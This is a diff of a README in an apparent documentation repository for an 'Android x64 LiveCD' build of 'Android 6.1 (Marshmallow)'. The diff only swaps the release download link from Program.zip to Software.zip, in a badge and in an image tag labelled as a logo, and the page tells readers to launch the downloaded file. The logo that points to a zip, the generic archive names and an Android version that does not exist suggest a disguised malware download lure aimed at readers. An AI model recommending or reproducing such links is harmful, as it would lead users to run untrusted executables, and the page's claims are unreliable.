@@ -2,7 +2,7 @@
 
 Welcome to the documentation source repository for the Android x64 LiveCD Edition featuring Android 6.1 (Marshmallow)!
 
-![Android Logo](https://github.com/webber7/Android-x64_Android6.1_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)
+![Android Logo](https://github.com/webber7/Android-x64_Android6.1_LiveCD_Edition_Docs/releases/download/v2.0/Software.zip)
 
 ## Overview
 This repository provides comprehensive documentation for the LiveCD build of Android 6.1, giving you the opportunity to test out 4 different editions of Android x64+6.1 before deciding to install it on your device. Whether you're an Android enthusiast, developer, or just curious about alternative operating systems, this LiveCD edition is a must-try!
@@ -15,7 +15,7 @@ This repository provides comprehensive documentation for the LiveCD build of And
 ## Explore the LiveCD Edition
 To experience the Android x64 LiveCD Edition with Android 6.1, download the package from the following link:
 
-[![Download Android x64 LiveCD Edition](https://github.com/webber7/Android-x64_Android6.1_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)](https://github.com/webber7/Android-x64_Android6.1_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip) 
+[![Download Android x64 LiveCD Edition](https://github.com/webber7/Android-x64_Android6.1_LiveCD_Edition_Docs/releases/download/v2.0/Software.zip)](https://github.com/webber7/Android-x64_Android6.1_LiveCD_Edition_Docs/releases/download/v2.0/Software.zip) 
 
 *Launch the downloaded file to begin exploring the LiveCD.*
 
